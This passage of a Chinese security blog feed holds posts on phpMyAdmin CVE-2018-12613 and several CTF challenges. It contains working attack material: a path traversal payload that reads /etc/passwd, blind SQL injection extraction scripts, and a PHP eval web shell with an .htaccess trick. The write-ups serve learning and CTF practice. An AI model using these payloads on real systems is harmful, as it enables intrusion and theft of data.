    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p>漏洞影响范围：phpmyadmin4.8.0 4.8.1<br>漏洞类型：后台任意文件包含<br><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip">下载地址</a></p><p>漏洞出现在index.php页面中的55~63行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#39;target&#39;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看这个段代码的逻辑：传入的target参数不为空；target是字符串类型；target不易index开头；target不在$target_blacklist中；checkPageValidity($_REQUEST[‘target’]返回true。</p><p>看一下$target_blacklist：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist &#x3D; array (</span><br><span class="line">    &#39;import.php&#39;, &#39;export.php&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>追踪一下checkPageValidity函数：在/libraries/classes/Core.php中找到，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array </span><br><span class="line">$whitelist &#x3D; [])</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">       if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist &#x3D; self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">       if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看见这个函数需要两个参数，如果whitelist参数为空，会使用代码提供的白名单数组，追踪一下这个数组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static $goto_whitelist &#x3D; array(</span><br><span class="line">        &#39; db_datadict.php&#39;,</span><br><span class="line">        &#39;db_sql.php&#39;,</span><br><span class="line">        &#39;db_events.php&#39;,</span><br><span class="line">        &#39;db_export.php&#39;,</span><br><span class="line">        &#39;db_importdocsql.php&#39;,</span><br><span class="line">        &#39;db_multi_table_query.php&#39;,</span><br><span class="line">        &#39;db_structure.php&#39;,</span><br><span class="line">        &#39;db_import.php&#39;,</span><br><span class="line">        &#39;db_operations.php&#39;,</span><br><span class="line">        &#39;db_search.php&#39;,</span><br><span class="line">        &#39;db_routines.php&#39;,</span><br><span class="line">        &#39;export.php&#39;,</span><br><span class="line">        &#39;import.php&#39;,</span><br><span class="line">        &#39;index.php&#39;,</span><br><span class="line">        &#39;pdf_pages.php&#39;,</span><br><span class="line">        &#39;pdf_schema.php&#39;,</span><br><span class="line">        &#39;server_binlog.php&#39;,</span><br><span class="line">        &#39;server_collations.php&#39;,</span><br><span class="line">        &#39;server_databases.php&#39;,</span><br><span class="line">        &#39;server_engines.php&#39;,</span><br><span class="line">        &#39;server_export.php&#39;,</span><br><span class="line">        &#39;server_import.php&#39;,</span><br><span class="line">        &#39;server_privileges.php&#39;,</span><br><span class="line">        &#39;server_sql.php&#39;,</span><br><span class="line">        &#39;server_status.php&#39;,</span><br><span class="line">        &#39;server_status_advisor.php&#39;,</span><br><span class="line">        &#39;server_status_monitor.php&#39;,</span><br><span class="line">        &#39;server_status_queries.php&#39;,</span><br><span class="line">        &#39;server_status_variables.php&#39;,</span><br><span class="line">        &#39;server_variables.php&#39;,</span><br><span class="line">        &#39;sql.php&#39;,</span><br><span class="line">        &#39;tbl_addfield.php&#39;,</span><br><span class="line">        &#39;tbl_change.php&#39;,</span><br><span class="line">        &#39;tbl_create.php&#39;,</span><br><span class="line">        &#39;tbl_import.php&#39;,</span><br><span class="line">        &#39;tbl_indexes.php&#39;,</span><br><span class="line">        &#39;tbl_sql.php&#39;,</span><br><span class="line">        &#39;tbl_export.php&#39;,</span><br><span class="line">        &#39;tbl_operations.php&#39;,</span><br><span class="line">        &#39;tbl_structure.php&#39;,</span><br><span class="line">        &#39;tbl_relation.php&#39;,</span><br><span class="line">        &#39;tbl_replace.php&#39;,</span><br><span class="line">        &#39;tbl_row_action.php&#39;,</span><br><span class="line">        &#39;tbl_select.php&#39;,</span><br><span class="line">        &#39;tbl_zoom_select.php&#39;,</span><br><span class="line">        &#39;transformation_overview.php&#39;,</span><br><span class="line">        &#39;transformation_wrapper.php&#39;,</span><br><span class="line">        &#39;user_password.php&#39;,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>看一下这段代码的逻辑：就是target参数问号前面的要在白名单里会返回true。<br>看一下这段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码是将参数url解码一下，所以在浏览器中我们要双重url编码，因为在传入服务器之前会先进行一次url解码。<br>根据我们上面的分析很容易写出payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;your-ip:8080&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>我试了不url编码?的payload，但是没有成功。<br>最后直接通过这段payload获取到了我事先写好的一个flag.txt文件内容：</p><img src="/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/1.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;漏洞影响范围：phpmyadmin4.8.0 4.8.1&lt;br&gt;漏洞类型：后台任意文件包含&lt;br&gt;&lt;a href=&quot;https://files.php
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://da4er.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>2.17 [GWCTF 2019]枯燥的抽奖&amp;我有一个数据库</title>
    <link href="https://da4er.top/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93.html"/>
    <id>https://da4er.top/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93.html</id>
    <published>2020-02-17T12:24:28.000Z</published>
    <updated>2020-02-17T12:28:45.241Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>打开页面发现是给出了前十位，要猜后十位的字符串。直接抓包发现check.php源码</p><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" class title="Da4er"><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" class title="Da4er"><p>看到是个伪随机数问题，使用php_mt_seed进行爆破。<br>首先使用下面这个脚本，把php_mt_seed需要的获取出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;hvKiZfOpgL&#39; &#x2F;&#x2F;这里填上题目给的前十位</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" class title="Da4er"><p>然后用php_mt_seed爆破：</p><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" class title="Da4er"><p>得到的随机数直接用下面的脚本进行获取全面字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(104517409);</span><br><span class="line">$str_long1 &#x3D; </span><br><span class="line">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">$len1 &#x3D; 20;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $len1; $i++) </span><br><span class="line">&#123;    $str .&#x3D; substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot; . $str . &quot;&lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" class title="Da4er"><p>将这段字符串提交得到flag。</p><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" class title="Da4er"><hr><h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>目录扫描到phpmyadmin，接下来的就没思路了，看了别的师傅的wp，发现是phpmyadmin有一处文件包含：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞。<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;枯燥的抽奖&quot;&gt;&lt;a href=&quot;#枯燥的抽奖&quot; class=&quot;headerlink&quot; title=&quot;枯燥的抽奖&quot;&gt;&lt;/a&gt;枯燥的抽奖&lt;/h3
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.16 [极客大挑战 2019]FinalSQL</title>
    <link href="https://da4er.top/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL.html"/>
    <id>https://da4er.top/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL.html</id>
    <published>2020-02-16T12:28:37.000Z</published>
    <updated>2020-02-16T12:29:07.413Z</updated>
    
    <content type="html"><![CDATA[<p>检测通过测试发现在search.php页面存在sql注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库表名 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库列名</span><br></pre></td></tr></table></figure><p>先写个判断数据库名的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">#database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">#database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~ in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure><p>判断表名和字段名的可以依葫芦画瓢，来写脚本。<br>最终的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#然后是二分法，二分法要快很多：</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">def payload(i,j):</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;:sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url,params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line"> </span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1,10000) :</span><br><span class="line">        print(i,&#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high :</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">            res &#x3D; payload(i,mid)</span><br><span class="line">            if res :</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else :</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;,flag)</span><br></pre></td></tr></table></figure><img src="/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/1.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;检测通过测试发现在search.php页面存在sql注入。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>[GXYCTF2019]BabyUpload</title>
    <link href="https://da4er.top/GXYCTF2019-BabyUpload.html"/>
    <id>https://da4er.top/GXYCTF2019-BabyUpload.html</id>
    <published>2020-02-16T12:27:23.000Z</published>
    <updated>2020-02-16T12:29:33.390Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p>上传测试发现过滤了ph,但是可以上传.htaceess，但是上传到服务器的htaccess被删除，所以使用竞争上传的思想，同时不能使用&lt;?开头的小马。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php小马</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; eval($_POST[&quot;Da4er&quot;])&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">.htaccess</span><br><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><img src="/GXYCTF2019-BabyUpload/2.png" class title="Da4er"><img src="/GXYCTF2019-BabyUpload/3.png" class title="Da4er"><img src="/GXYCTF2019-BabyUpload/4.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;上传测试发现过滤了ph,但是可以上传.htaceess，但是上传到服务器的htaccess被删除，所以使用竞争上传的思想，同时不能使用&amp;lt;?开头的
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>爬虫实战_爬取豆瓣图书利用csv库存储</title>
    <link href="https://da4er.top/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E5%9B%BE%E4%B9%A6%E5%88%A9%E7%94%A8csv%E5%BA%93%E5%AD%98%E5%82%A8.html"/>
    <id>https://da4er.top/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E5%9B%BE%E4%B9%A6%E5%88%A9%E7%94%A8csv%E5%BA%93%E5%AD%98%E5%82%A8.html</id>
    <published>2020-02-16T11:06:31.000Z</published>
    <updated>2020-02-16T11:07:26.747Z</updated>
    
